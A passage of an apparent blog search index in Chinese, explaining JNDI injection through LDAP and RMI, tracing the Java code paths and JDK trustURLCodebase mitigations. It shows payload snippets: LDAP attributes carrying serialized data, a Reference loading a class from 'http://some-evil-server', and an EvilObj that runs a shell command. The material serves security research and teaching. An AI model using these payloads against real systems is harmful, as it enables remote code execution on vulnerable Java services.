\u4ece\u5c5e\u6027 \u4e2d \u63d0\u53d6 \u51fa   javaClassName   \u548c   javaFactory   \uff0c \u6700\u540e \u5c06 \u751f\u6210 \u4e00\u4e2a Reference \u3002 \u8fd9\u91cc \u5982\u679c \u770b\u8fc7 \u6211 \u524d\u9762 \u7684 \u90a3 \u7bc7   jndi - with - rmi   \uff0c \u53ef\u4ee5 \u770b\u5230 \u5176\u5b9e \u8fd9\u91cc \u751f\u6210 \u7684 ref \u5c31\u662f \u6211\u4eec \u5728 RMI \u8fd4\u56de \u7684 \u90a3\u4e2a ReferenceWrapper \uff0c \u540e\u9762 \u8fd9\u4e2a ref \u5c06\u4f1a \u4f20\u9012 \u7ed9 Naming   Manager \u53bb \u5904\u7406 \uff0c \u5305\u62ec \u4ece codebase \u4e2d \u83b7\u53d6 class \u6587\u4ef6 \u5e76 \u8f7d\u5165 \u3002   \u800c \u8fd9\u91cc LDAP \u4e5f \u7c7b\u4f3c \uff0c \u5904\u7406 ref \u7684 \u5bf9\u8c61 \u662f NamingManager \u7684 \u5b50\u7c7b javax / naming / spi / DirectoryManager . java \uff0c \u56e0\u4e3a \u8ddf RMI \u6709\u70b9 \u7c7b\u4f3c \u4e0d \u5177\u4f53 \u5206\u6790 \u5177\u4f53\u5206\u6790 \u4e86 \uff0c \u6700\u540e \u540c\u6837 \u7531 javax / naming / spi / NamingManager . java # getObjectFactoryFromReference \u6765 \u5904\u7406 \u3002   \u5230 \u8fd9\u91cc \uff0c \u6211\u4eec \u518d \u6765\u770b mbechler   \u5b9e\u73b0 \u7684 LDAPRefServer \u5c31 \u6bd4\u8f83 \u6e05\u695a \u6bd4\u8f83\u6e05\u695a \u4e86   \u5f53\u5176 \u83b7\u53d6 \u5230 LDAP \u8fde\u63a5 \u65f6 \uff0c \u5c06 \u586b\u5145 \u5982\u4e0a \u7684 \u51e0\u4e2a \u5c5e\u6027 \u53ca\u5176 \u5bf9\u5e94 \u7684 \u503c \uff0c \u5c31\u662f \u4e3a\u4e86 \u6ee1\u8db3 \u4e0a\u9762 \u7684 \u6761\u4ef6 \u800c \u751f\u6210 \u4e00\u4e2a Reference \u5bf9\u8c61 \u3002","title":"0x02   LDAP   with   JDNI   References"},{"location":"blog/2020/jndi-with-ldap-20200301/#0x03-ldap-with-serialized-object","text":"JNDI \u5bf9\u4e8e \u5c5e\u6027 \u4e2d \u7684 \u5e8f\u5217 \u5e8f\u5217\u5316 \u6570\u636e \u7684 \u5904\u7406 \u4e00\u5171 \u6709 \u4e24\u4e2a \u5730\u65b9 \uff0c \u6211\u4eec \u5148 \u6765 \u987a\u7740 \u524d\u9762 \u7684 JNDI   Reference \u7684 \u601d\u8def \u8bf4 \u4e0b\u53bb","title":"0x03   LDAP   with   Serialized   Object"},{"location":"blog/2020/jndi-with-ldap-20200301/#comsunjndildapobjjavadecodeobject","text":"\u5728 com / sun / jndi / ldap / Obj . java # decodeObject \u4e0a \u8fd8 \u5b58\u5728 \u4e00\u4e2a \u5224\u65ad   if   ( (   attr   =   attrs   .   get   (   JAVA _ ATTRIBUTES   [   SERIALIZED _ DATA   ]   ) )   ! =   null   )   {   / /   \u201c javaSerializedData \u201d   ClassLoader   cl   =   helper   .   getURLClassLoader   (   codebases   ) ;   return   deserializeObject   ( (   byte   [ ]   )   attr   .   get   ( ) ,   cl   ) ;   }   \u5982\u679c \u5728 \u8fd4\u56de \u7684 \u5c5e\u6027 \u4e2d \u5b58\u5728   javaSerializedData   \uff0c \u5c06 \u7ee7\u7eed \u8c03\u7528   deserializeObject   \u51fd\u6570 \uff0c \u8be5 \u51fd\u6570 \u4e3b\u8981 \u5c31\u662f \u8c03\u7528 \u5e38\u89c4 \u7684 \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 \u65b9\u5f0f readObject \u5bf9 \u5e8f\u5217 \u5e8f\u5217\u5316 \u6570\u636e \u8fdb\u884c \u8fd8\u539f \uff0c \u5982\u4e0b payload \u3002   @ Override   protected   void   processAttribute   (   Entry   entry   ) {   entry   .   addAttribute   (   \" javaClassName \"   ,   \" foo \"   ) ;   entry   .   addAttribute   (   \" javaSerializedData \"   ,   serialized   ) ;   }   \u8fd9\u91cc \u6211\u4eec \u5c31 \u4e0d \u9700\u8981 \u901a\u8fc7 \u8fdc\u7a0b codebase \u7684 \u65b9\u5f0f \u6765 \u8fbe\u6210 RCE \uff0c \u5f53\u7136 \u9996\u5148 \u672c\u5730 \u73af\u5883 \u4e0a \u9700\u8981 \u6709 \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 \u5229\u7528 \u94fe\u6240 \u4f9d\u8d56 \u7684 \u5e93 \u6587\u4ef6 \u3002","title":"\u7b2c\u4e00\u5904 \uff1a com / sun / jndi / ldap / Obj . java # decodeObject"},{"location":"blog/2020/jndi-with-ldap-20200301/#comsunjndildapobjjavadecodereference","text":"decodeReference   \u51fd\u6570 \u5728 \u5bf9 \u666e\u901a \u7684 Reference \u8fd8\u539f \u7684 \u57fa\u7840 \u4e0a \uff0c \u8fd8 \u53ef\u4ee5 \u4e00\u6b65 \u8fdb\u4e00\u6b65 \u5bf9 RefAddress \u505a \u8fd8\u539f \u5904\u7406 \uff0c \u5176\u4e2d \u8fd8\u539f \u8fc7\u7a0b \u4e2d \uff0c \u4e5f \u8c03\u7528 \u4e86   deserializeObject   \u51fd\u6570 \uff0c \u8fd9 \u610f\u5473 \u610f\u5473\u7740 \u6211\u4eec \u901a\u8fc7 \u6ee1\u8db3 RefAddress \u7684 \u65b9\u5f0f \uff0c \u4e5f \u53ef\u4ee5 \u8fbe\u5230 \u4e0a\u9762 \u7b2c\u4e00 \u4e00\u79cd \u7b2c\u4e00\u79cd \u7684 \u6548\u679c \u3002   \u5177\u4f53 \u4ee3\u7801 \u592a\u957f \u4e86 \uff0c \u8fd9\u91cc \u6211 \u5c31 \u8bf4 \u4e00\u4e0b \u6761\u4ef6 \uff1a   \u7b2c\u4e00 \u4e00\u4e2a \u7b2c\u4e00\u4e2a \u5b57\u7b26 \u4e3a \u5206\u9694 \u5206\u9694\u7b26   \u7b2c\u4e00 \u4e00\u4e2a \u7b2c\u4e00\u4e2a \u5206\u9694 \u5206\u9694\u7b26 \u4e0e \u7b2c\u4e8c \u4e8c\u4e2a \u7b2c\u4e8c\u4e2a \u5206\u9694 \u5206\u9694\u7b26 \u4e4b\u95f4 \uff0c \u8868\u793a Reference \u7684 position \uff0c \u4e3a int \u7c7b\u578b   \u7b2c\u4e8c \u4e8c\u4e2a \u7b2c\u4e8c\u4e2a \u5206\u9694 \u5206\u9694\u7b26 \u4e0e \u7b2c\u4e09 \u4e09\u4e2a \u7b2c\u4e09\u4e2a \u5206\u9694 \u5206\u9694\u7b26 \u4e4b\u95f4 \uff0c \u8868\u793a type \uff0c \u7c7b\u578b   \u7b2c\u4e09 \u4e09\u4e2a \u7b2c\u4e09\u4e2a \u5206\u9694 \u5206\u9694\u7b26 \u662f \u53cc \u5206\u9694 \u5206\u9694\u7b26 \u7684 \u5f62\u5f0f \uff0c \u5219 \u8fdb\u5165 \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 \u7684 \u64cd\u4f5c   \u5e8f\u5217 \u5e8f\u5217\u5316 \u6570\u636e \u7528 base64 \u7f16\u7801   \u6ee1\u8db3 \u4e0a\u9762 \u7684 \u6761\u4ef6 \uff0c \u6784\u9020 \u4e00\u4e2a \u7c7b\u4f3c \u7684   protected   void   processAttribute   (   Entry   entry   ) {   entry   .   addAttribute   (   \" javaClassName \"   ,   \" foo \"   ) ;   entry   .   addAttribute   (   \" javaReferenceAddress \"   ,   \" $ 1 $ String $ $ \"   +   new   BASE64Encoder   ( ) .   encode   (   serialized   ) ) ;   entry   .   addAttribute   (   \" objectClass \"   ,   \" javaNamingReference \"   ) ;   / / $ NON - NLS - 1 $   }   \u5f53\u7136 \u7b2c\u4e8c \u4e8c\u5904 \u7b2c\u4e8c\u5904 \u53ea\u662f \u4e00\u4e2a \u9526\u4e0a\u6dfb\u82b1 \u7684 \u6b65\u9aa4 \uff0c \u6211\u4eec \u53ef\u4ee5 \u76f4\u63a5 \u7528 \u7b2c\u4e00 \u4e00\u79cd \u7b2c\u4e00\u79cd \u65b9\u6cd5 \uff0c \u7b2c\u4e8c \u4e8c\u79cd \u7b2c\u4e8c\u79cd \u5728 \u7b2c\u4e00 \u4e00\u79cd \u7b2c\u4e00\u79cd \u4e0d\u80fd \u7528 \u7684 \u60c5\u51b5 \u4e0b \u53ef\u4ee5 \u8bd5\u8bd5 \u3002","title":"\u7b2c\u4e8c\u5904 \uff1a com / sun / jndi / ldap / Obj . java # decodeReference"},{"location":"blog/2020/jndi-with-ldap-20200301/#0x04","text":"\u81ea   jdk8u191 - b02   \u7248\u672c \u540e \uff0c \u65b0 \u6dfb\u52a0 \u4e86   com . sun . jndi . ldap . object . trustURLCodebase   \u9ed8\u8ba4 \u4e3a false \u7684 \u9650\u5236 \uff0c \u4e5f \u5c31 \u610f\u5473 \u610f\u5473\u7740 \u8fdc\u7a0b codebase \u7684 Reference \u65b9\u5f0f \u88ab \u9650\u5236 \u6b7b \u4e86 \uff0c \u6211\u4eec \u53ea\u80fd \u901a\u8fc7 SerializedData \u7684 \u65b9\u6cd5 \u6765 \u8fbe\u6210 \u5229\u7528 \u3002   \u6211\u4eec \u6765 \u6574\u7406 \u4e00\u4e0b \uff0c \u5173\u4e8e jndi \u7684 \u76f8\u5173 \u5b89\u5168 \u66f4\u65b0 \u5b89\u5168\u66f4\u65b0   JDK   6u132 ,   JDK   7u122 ,   JDK   8u113 \u4e2d \u6dfb\u52a0 \u4e86 com . sun . jndi . rmi . object . trustURLCodebase \u3001 com . sun . jndi . cosnaming . object . trustURLCodebase   \u7684 \u9ed8\u8ba4 \u9ed8\u8ba4\u503c \u53d8\u4e3a false \u3002   \u5bfc\u81f4 jndi \u7684 rmi   reference \u65b9\u5f0f \u5931\u6548 \uff0c \u4f46 ldap \u7684 reference \u65b9\u5f0f \u4ecd\u7136 \u53ef\u884c   Oracle   JDK   11.0 . 1 \u3001 8u191 \u3001 7u201 \u3001 6u211 \u4e4b\u540e   com . sun . jndi . ldap . object . trustURLCodebase   \u5c5e\u6027 \u7684 \u9ed8\u8ba4 \u9ed8\u8ba4\u503c \u88ab \u8c03\u6574 \u4e3a false \u3002   \u5bfc\u81f4 jndi \u7684 ldap   reference \u65b9\u5f0f \u5931\u6548 \uff0c \u5230 \u8fd9\u91cc \u4e3a\u6b62 \uff0c \u8fdc\u7a0b codebase \u7684 \u65b9\u5f0f \u57fa\u672c \u5931\u6548 \uff0c \u9664\u975e \u8ba4\u4e3a \u8bbe\u4e3a true   \u800c \u5728 \u6700\u65b0 \u65b0\u7248 \u6700\u65b0\u7248 \u7684 jdk8u \u4e0a \uff0c jndi   ldap \u7684 \u672c\u5730 \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 \u5229\u7528 \u94fe   1   \u548c   2   \u7684 \u65b9\u5f0f \u4ecd\u7136 \u672a \u5931\u6548 \uff0c jndi   rmi \u5e95\u5c42 ( JRMPListener )   StreamRemoteCall   \u7684 \u672c\u5730 \u5229\u7528 \u65b9\u5f0f \u4ecd \u672a \u5931\u6548 \u3002   \u6240\u4ee5 \u5982\u679c Reference \u7684 \u65b9\u5f0f \u4e0d\u884c \u7684 \u65f6\u5019 \uff0c \u53ef\u4ee5 \u8bd5\u8bd5 \u5229\u7528 \u672c\u5730 ClassPath \u91cc \u7684 \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 \u5229\u7528 \u94fe\u6765 \u8fbe\u6210 RCE \u3002","title":"0x04   \u540e\u7eed"},{"location":"blog/2020/jndi-with-ldap-20200301/#0x05","text":"JNDI \u548c LDAP \u7684 \u7ed3\u5408 \uff0c \u51fa\u73b0 \u4e86 2 \u79cd \u5229\u7528 \u65b9\u5f0f \uff0c \u4e00\u662f \u5229\u7528 \u8fdc\u7a0b codebase \u7684 \u65b9\u5f0f \uff0c \u4e8c\u662f \u5229\u7528 \u672c\u5730 ClassPath \u91cc \u7684 \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 \u5229\u7528 \u94fe \u3002 \u5728 \u6700\u65b0 \u65b0\u7248 \u6700\u65b0\u7248 \u7684 jdk8u \u4e2d \uff0c codebase \u7684 \u65b9\u5f0f \u4f9d\u8d56   com . sun . jndi . ldap . object . trustURLCodebase   \u7684 \u503c \uff0c \u800c \u7b2c\u4e8c \u4e8c\u79cd \u7b2c\u4e8c\u79cd \u65b9\u5f0f \u4ecd \u672a \u5931\u6548 \u3002   LDAP \u7684 \u4f7f\u7528 \u65b9\u6cd5 \u9664\u4e86 JNDI \u7684 lookup \uff0c \u5176\u4ed6 \u7684 \u5e93 \u4e5f \u4f1a \u6709 \u76f8\u5e94 \u7684 \u4f7f\u7528 \u65b9\u6cd5 \uff0c \u5982 Spring \u7684 ldap \uff0c \u8fd9\u91cc \u8fd8 \u53ef\u4ee5 \u7ee7\u7eed \u6df1\u5165 \u4e0b\u53bb \uff0c \u5148 \u6316\u4e2a \u5751 XD   \u6700\u540e \uff0c \u4e0a\u9762 \u7684 \u4e24\u4e2a ldap   Server \u66f4\u65b0 \u5230 \u4e86   github   \u4e0a \uff0c \u81ea\u53d6 XD","title":"0x05   \u603b\u7ed3"},{"location":"blog/2020/jndi-with-rmi-20200209/","tags":["java"],"text":"0x00   \u524d\u8a00   \u5728 \u73b0\u5b9e \u73af\u5883 \u4e2d \uff0c \u9047\u5230 RMI   Registry \u7684 \u673a\u4f1a \u5f88\u5c11 \uff0c \u800c \u7ed3\u5408 \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 \u6f0f\u6d1e \u7684 JNDI \u6ce8\u5165 \u5219 \u5e38\u89c1 \u4e86 \u8bb8\u591a \u3002 \u672c\u6587 \u5c06 \u4ecb\u7ecd RMI \u7ed3\u5408 JNDI \u540e \u53ef\u4ee5 \u505a \u54ea\u4e9b \u4e8b\u60c5 XD   0x01   \u57fa\u7840   \u5728 \u770b JNDI \u540c RMI \u7684 \u5229\u7528 \u524d \uff0c \u6211\u4eec \u5148 \u6765 \u770b\u770b \u5173\u4e8e RMI \u52a8\u6001 \u7c7b \u52a0\u8f7d \u7684 \u6982\u5ff5 \u3002   RMI \u52a8\u6001 \u7c7b \u52a0\u8f7d   RMI \u6709 \u4e00\u4e2a \u91cd\u8981 \u7684 \u7279\u6027 \u662f \u52a8\u6001 \u7c7b \u52a0\u8f7d \u673a\u5236 \uff0c \u5f53 \u672c\u5730 CLASSPATH \u4e2d \u65e0\u6cd5 \u627e\u5230 \u76f8\u5e94 \u7684 \u7c7b\u65f6 \uff0c \u4f1a \u5728 \u6307\u5b9a \u7684 codebase \u91cc \u52a0\u8f7d class \u3002 codebase \u53ef\u4ee5 \u5728 \u7cfb\u7edf \u5c5e\u6027 java . rmi . server . codebase \u8bbe\u7f6e \u5176 URL \u3002 \u5982\u679c codebase \u7684 URL \u53ef\u63a7 \uff0c \u90a3\u4e48 \u6211\u4eec \u5c31 \u53ef\u4ee5 \u8f7d\u5165 \u4efb\u610f \u7684 class \u6216 jar \u6587\u4ef6 \u3002 \u6839\u636e P \u725b \u7684 Java \u5b89\u5168 \u6f2b\u8c08 -   RMI \u7bc7 \u4e2d \u63d0\u5230 \uff0c \u901a\u8fc7 \u4fee\u6539 \u4f20\u9012 \u8fc7\u7a0b \u4e2d \u7684 \u5e8f\u5217 \u5e8f\u5217\u5316 \u6570\u636e \uff0c \u5c06 \u5176\u4e2d \u7684 codebase \u4fee\u6539 \u4e3a \u6076\u610f \u7684 server \uff0c \u8fd9\u6837 \u53ef\u4ee5 \u8fbe\u5230 RMI   Server \u7aef \u88ab \u653b\u51fb \u7684 \u6548\u679c \u3002 \u4e0d\u8fc7 \uff0c \u8fd9\u4e2a \u5229\u7528 \u6761\u4ef6 \u6bd4\u8f83 \u82db\u523b \uff0c \u5e76\u4e14 oracle \u5728 \u540e\u9762 \u5bf9 \u5176 \u505a \u4e86 \u9650\u5236 \uff0c \u5982\u679c \u8981 \u6210\u529f \u5229\u7528 \u9700\u8981 \u6ee1\u8db3 \u5982\u4e0b \u8981\u6c42 \uff1a   \u5b89\u88c5 \u5e76 \u914d\u7f6e \u4e86 SecurityManager   Java \u7248\u672c \u4f4e\u4e8e 7u21 \uff0c 6u45 \u6216\u8005 \u8bbe\u7f6e \u4e86   java . rmi . server . useCodebaseonly = false   \u6458\u81ea Java \u5b89\u5168 \u6f2b\u8c08 - RMI \u7bc7   \u5176\u4e2d \u4e0a\u9762 \u7684 \u914d\u7f6e \uff0c \u5728 7u21 \uff0c 6u45 \u540e \u7684 \u7248\u672c \u91cc \u9ed8\u8ba4 \u4e3a   true   \uff0c \u90a3\u4e48 \u4e5f \u5c31 \u65e0\u6cd5 \u4ece \u8fdc\u7a0b codebase \u4e2d \u8f7d\u5165 \u7c7b \uff0c \u907f\u514d \u4e86 \u4e0a\u9762 \u8bf4 \u7684 \u8fd9\u79cd \u653b\u51fb \u7684 \u53ef\u80fd \u53ef\u80fd\u6027 \u3002   JNDI \u7684 \u76f8\u5173 \u6982\u5ff5   Java   Naming   and   Directory   Interface   ( JNDI )   is   a   Java   API   that   allows   clients   to   discover   and   look   up   data   and   objects   via   a   name .   https : / / www . blackhat . com / docs / us - 16 / materials / us - 16 - Munoz - A - Journey - From - JNDI - LDAP - Manipulation - To - RCE - wp . pdf   JNDI \u65b9\u4fbf \u4e86 \u4e0e naming   service \u548c Directory   service \u7684 \u4ea4\u4e92 \uff0c \u901a\u8fc7 \u6307\u5b9a \u7279\u5b9a \u7684 URL \u5373\u53ef \u4e0e \u4e0d\u540c \u7684 \u670d\u52a1 \u8fdb\u884c \u4ea4\u4e92 \u3002 \u76f8\u5f53 \u5f53\u4e8e \u76f8\u5f53\u4e8e \u5bf9 \u8fd9\u4e9b \u670d\u52a1 \u7684 API \u53c8 \u8fdb\u884c \u4e86 \u4e00\u6b21 \u5c01\u88c5 \u4f9b \u5f00\u53d1 \u53d1\u4eba \u4eba\u5458 \u5f00\u53d1\u4eba\u5458 \u4f7f\u7528 \u3002 \u5176\u4e2d JNDI \u4e2d \u4e5f \u5b58\u5728 \u4e0a\u8ff0 RMI   codebase \u7684 \u52a8\u6001 \u52a0\u8f7d \u673a\u5236 \uff0c \u5e76\u4e14 \u5176 \u914d\u7f6e \u540c \u5e95\u5c42 \u7684 RMI \u914d\u7f6e \u5e76 \u4e0d \u76f8\u5173 \u3002   \u4ece \u4e0a\u8ff0 \u7684 \u6784\u67b6 \u6765\u770b \uff0c \u52a8\u6001 \u52a0\u8f7d \u53d1\u751f \u4e8e \u4e24\u4e2a \u90e8\u5206 \uff0c Naming   Manager \u548c JNDI   SPI \u3002 \u8fd9\u91cc SPI \u90e8\u5206 \u5c31\u662f \u76f8\u5bf9 \u5e94 \u7684 \u670d\u52a1 \u7684 \u914d\u7f6e \uff0c \u6bd4\u5982 \u524d \u6587 \u63d0\u5230 \u7684 RMI \u7684 \u9650\u5236 \u5c31\u662f SPI \u90e8\u5206 \u7684 \u3002 \u800c Naming   Manager \u4e5f \u5b58\u5728 \u4e00\u4e2a \u52a8\u6001 \u52a0\u8f7d \u673a\u5236 \u5e76\u4e14 \u5176 \u5728 \u4fee\u590d \u524d \u5e76 \u65e0 \u9650\u5236 \uff0c \u8fd9\u91cc Naming   Manager \u90e8\u5206 \u7528\u5230 \u7684 \u662f JNDI \u7684 Naming   References   In   order   to   bind   Java   objects   in   a   Naming   or   Directory   service ,   it   is   possible   to   use   Java   serialization   to   get   the   byte   array   representation   of   an   object   at   a   given   state .   However ,   it   is   not   always   possible   to   bind   the   serialized   state   of   an   object   because   it   might   be   too   large   or   it   might   be   inadequate .   For   such   needs ,   JNDI   defined   Naming   References   ( or   just   References   from   now   on )   so   that   objects   could   be   stored   in   the   Naming   or   Directory   service   indirectly   by   binding   a   reference   that   could   be   decoded   by   the   Naming   Manager   and   resolved   to   the   original   object .   https : / / www . blackhat . com / docs / us - 16 / materials / us - 16 - Munoz - A - Journey - From - JNDI - LDAP - Manipulation - To - RCE - wp . pdf   \u8fd9\u91cc \u63d0\u5230 \u7531\u4e8e \u67d0\u4e9b \u60c5\u51b5 \u4e0d\u80fd \u76f4\u63a5 \u5c06 \u8fdc\u7a0b obj \u8fd4\u56de \uff0c \u6240\u4ee5 JNDI \u63d0\u51fa \u4e86 Naming   References \u7684 \u65b9\u6cd5 \uff0c \u8fd4\u56de \u76f8\u5e94 \u7684 Reference \u800c \u4e0d \u8fd4\u56de \u5177\u4f53 \u7684 obj \u3002 \u7edf\u4e00 \u7531 JNDI \u7684 \u8bf7\u6c42 \u7aef \u53bb \u52a0\u8f7d \u6307\u5b9a \u7684 \u5730\u5740 \u4e0a \u7684 obj \u3002 \u8fd9\u91cc \u52a0\u8f7d \u65b9\u6cd5 \u4e2d \u5c31 \u5305\u62ec \u8fdc\u7a0b codebase \u7684 \u65b9\u6cd5 \uff0c \u6765\u770b \u4e2a \u4f8b\u5b50   String   FactoryURL   =   \" http : / / some - evil - server \"   ;   Reference   reference   =   new   Reference   (   \" MyClass \"   ,   \" MyClass \"   ,   FactoryURL   ) ;   ReferenceWrapper   wrapper   =   new   ReferenceWrapper   (   reference   ) ;   ctx   .   bind   (   \" Foo \"   ,   wrapper   ) ;   / /   \u7ed1\u5b9a reference   \u8bf7\u6c42 \u7aef\u4ee5 lookup \u8bf7\u6c42 \u4e0a\u8ff0 \u7ed1\u5b9a \u7684 RMI \u670d\u52a1 \u5373\u53ef \u3002 \u5176 \u5904\u7406 \u7406\u8fc7 \u8fc7\u7a0b \u5904\u7406\u8fc7\u7a0b \u5f15\u7528 https : / / www . blackhat . com / docs / us - 16 / materials / us - 16 - Munoz - A - Journey - From - JNDI - LDAP - Manipulation - To - RCE - wp . pdf   0x02   \u539f\u7406   JNDI   with   RMI   DEMO   \u4e3a\u4e86 \u66f4\u597d \u7684 \u8bf4\u660e \uff0c \u4ee5 \u4e0b\u9762 \u7684 \u4ee3\u7801 \u4e3a\u4f8b   package   train . jndi   ;   import   com . sun . jndi . rmi . registry . ReferenceWrapper   ;   import   javax . naming . Reference   ;   import   java . rmi . registry . LocateRegistry   ;   import   java . rmi . registry . Registry   ;   / * *   *   @ author   wh1t3P1g   *   @ since   2020 / 2 / 4   * /   public   class   Server   {   public   static   void   main   (   String   [ ]   args   )   throws   Exception   {   Registry   registry   =   LocateRegistry   .   createRegistry   (   1099   ) ;   String   FactoryURL   =   \" http : / / localhost / \"   ;   Reference   reference   =   new   Reference   (   \" EvilObj \"   ,   \" EvilObj \"   ,   FactoryURL   ) ;   ReferenceWrapper   wrapper   =   new   ReferenceWrapper   (   reference   ) ;   registry   .   bind   (   \" Foo \"   ,   wrapper   ) ;   }   }   Server \u7aef\u4ee5 RMI   Registry \u6ce8\u518c \u4e00\u4e2a Reference \uff0c \u5e76 \u5c06 factoryURL \u6307\u5b9a \u4e3a localhost   package   train . jndi   ;   import   javax . naming . Context   ;   import   javax . naming . InitialContext   ;   / * *   *   @ author   wh1t3P1g   *   @ since   2020 / 2 / 4   * /   public   class   Client   {   public   static   void   main   (   String   [ ]   args   )   throws   Exception   {   Context   ctx   =   new   InitialContext   ( ) ;   ctx   .   lookup   (   \" rmi : / / localhost : 1099 / Foo \"   ) ;   }   }   Client \u7aef \u6bd4\u8f83 \u7b80\u5355 \u6bd4\u8f83\u7b80\u5355 \uff0c \u76f4\u63a5 \u4ee5 lookup \u6307\u5b9a \u7684 RMI   URL \u5373\u53ef \u3002 \u6839\u636e \u4e0a\u9762 \u7684 \u8fc7\u7a0b \u56fe \uff0c \u6211\u4eec \u53ef\u4ee5 \u77e5\u9053 \u7684 \u662f \u6700\u7ec8 \u6267\u884c EvilObj \u7684 \u5730\u65b9 \u662f Client \u7aef ( jndi \u53d1\u8d77 lookup \u7684 \u65b9\u6cd5 ) \u3002 \u6700\u540e \u6211\u4eec \u521b \u4e00\u4e2a EvilObj   / * *   *   @ author   wh1t3P1g   *   @ since   2020 / 2 / 4   * /   public   class   EvilObj   {   public   EvilObj   ( )   throws   Exception   {   Runtime   rt   =   Runtime   .   getRuntime   ( ) ;   String   [ ]   commands   =   {   \" / bin / sh \"   ,   \" - c \"   ,   \" open   / System / Applications / Calculator . app \"   } ;   rt   .   exec   (   commands   ) ;   }   }   javac   EvilObj . java   \u751f\u6210 EvilObj . class \uff0c \u7136\u540e \u6302\u8f7d \u5230 \u4e00\u4e2a web \u670d\u52a1 \u4e0a \u5c31 \u53ef\u4ee5 \u4e86 \u3002 \u53ef\u4ee5 \u76f4\u63a5 \u9009\u62e9 python \u6765 \u6302\u8f7d   \u90a3\u4e48 \u6211\u4eec \u6765 \u5177\u4f53 \u770b \u4e00\u4e0b lookup \u51fd\u6570 \u5177\u4f53 \u505a \u4e86 \u4ec0\u4e48   \u9996\u5148 InitialContext \u7684 lookup \u51fd\u6570 \uff0c \u4f1a \u6839\u636e \u63d0\u4f9b \u7684 URL \u81ea\u52a8 \u9009\u62e9 \u5408\u9002 \u7684 InitialContext \uff08 \u5206\u79bb \u51fa \u534f\u8bae \u540e \u8fdb\u884c \u9009\u62e9 \uff09 \uff0c \u6bd4\u5982 \u6b64\u65f6 \u7684 InitialContext \u4e3a rmiURLContext   \u7ee7\u7eed \u8ddf\u8fdb   com / sun / jndi / toolkit / url / GenericURLContext . java # lookup   \u8fd9\u91cc \u7684 ctx \u4e3a RegistryContext \uff0c \u5c06 \u5bf9 \u6307\u5b9a \u7684 RMI   Registry \u83b7\u53d6 \u7ed1\u5b9a \u7684 obj   \u83b7\u53d6 \u5230 \u8fdc\u7a0b \u5bf9\u8c61 \uff0c \u5e76 \u8c03\u7528 decodeObject \u51fd\u6570   \u5982\u679c \u5f53\u524d \u7684 remote \u5bf9\u8c61 \u662f RemoteReference \u7c7b\u578b \uff0c \u5219 \u4e00\u6b65 \u8fdb\u4e00\u6b65 \u8bf7\u6c42 Registry \u83b7\u53d6 \u8be5 Reference \u7684 \u5185\u5bb9 \u3002 \u5230 \u8fd9\u91cc \u4e3a\u6b62 \uff0c \u6211\u4eec \u63a5\u4e0b \u4e0b\u6765 \u63a5\u4e0b\u6765 \u7684 \u8bf7\u6c42 \u5c31 \u540c Server \u7aef\u7684 \u5173\u7cfb \u4e0d\u5927 \u5173\u7cfb\u4e0d\u5927 \u4e86 \uff0c Client \u4f1a \u6839\u636e \u62ff\u5230 \u7684 Reference \u8bf7\u6c42 \u76f8\u5e94 \u7684 \u670d\u52a1 \u52a1\u5668 \u670d\u52a1\u5668   \u7ee7\u7eed \u8ddf\u8fdb getObjectInstance   \u8fd9\u91cc \u4f1a \u7ee7\u7eed \u8c03\u7528 NamingManager \u7684 getObjectFactoryFromReference \uff0c \u8be5 \u51fd\u6570 \u5b8c\u6210 \u4e86 \u5411 FactoryURL \u8bf7\u6c42 \u5177\u4f53 \u7684 class \u6587\u4ef6 \u7684 \u529f\u80fd \u3002   \u8fd9\u91cc \u53ef\u4ee5 \u770b\u5230 \uff0c \u6839\u636e factoryName \u548c codebase \u5c06 \u8fdc\u7a0b \u8f7d\u5165 \u76f8\u5e94 \u7684 class \u6587\u4ef6 ( \u8fd9\u91cc \u7684 loadClass \u7528 \u7684 URLClassLoader \u6765 \u5b8c\u6210 \u4efb\u52a1 )   \u5e76 \u5728 \u7b2c 163 \u884c\u5bf9 \u8f7d\u5165 \u7684 obj \u8fdb\u884c \u521d\u59cb \u521d\u59cb\u5316 \uff0c \u8fd9 \u4e5f \u5c31\u662f \u4ec0\u4e48 \u4e3a\u4ec0\u4e48 \u6211\u4eec \u9700\u8981 \u628a payload \u5199 \u5728 \u6784\u9020 \u51fd\u6570 \u6784\u9020\u51fd\u6570 \u91cc \u3002   \u5728 \u5229\u7528 \u4e2d \uff0c lookup \u51fd\u6570 \u7684 \u53c2\u6570 \u5fc5\u987b \u662f \u53ef\u63a7 \u7684 \uff0c \u6216\u8005 \u5229\u7528 \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 \u5229\u7528 \u94fe \u7684 \u65b9\u5f0f \u6765 \u5b8c\u6210 \uff0c \u6bd4\u5982 \u4e0b\u9762 \u7684 \u4e24\u4e2a \u6848\u4f8b   \u6848\u4f8b \u4e00 \uff1a Spring \u6846\u67b6 \u7684 JtaTransactionManager \u7c7b   16 \u5e74 \u7684 \u65f6\u5019 Spring \u6846\u67b6 \u66b4\u4e86 \u4e00\u4e2a \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 \u7684 \u53ef \u5229\u7528 \u70b9 JtaTransactionManager \uff0c \u5176 \u539f\u7406 \u5c31\u662f \u5229\u7528 \u4e86 JNDI   \u53ef\u63a7 \u7684 lookup \u53c2\u6570 \uff08 \u8fd9\u91cc \u7684 \u53ef\u63a7 \u7531 \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 \u6765 \u5b8c\u6210 \uff09 \u3002 \u6765\u770b \u4e00\u4e0b \u539f\u7406   org / springframework / transaction / jta / JtaTransactionManager . java # readObject   \u8fd9\u91cc 1230 \u884c \u521d\u59cb \u521d\u59cb\u5316 \u4e86 \u4e00\u4e2a jdni \u7684 context \uff0c \u8fd9\u4e2a context \u5c06 \u7528\u4e8e \u540e\u7eed \u7684 JNDI   lookup   \u7ee7\u7eed \u8ddf\u8fdb initUserTransactionAndTranscationManager   \u7ee7\u7eed \u8ddf\u8fdb lookupUserTransaction   \u8fd9\u91cc \u6700\u7ec8 \u8c03\u7528 \u4e86 context \u7684 lookup \u51fd\u6570 \uff0c \u5e76\u4e14 \u5176 \u53c2\u6570 \u4e3a userTransactionName \uff0c \u8fd9\u4e2a \u90e8\u5206 \u6211\u4eec 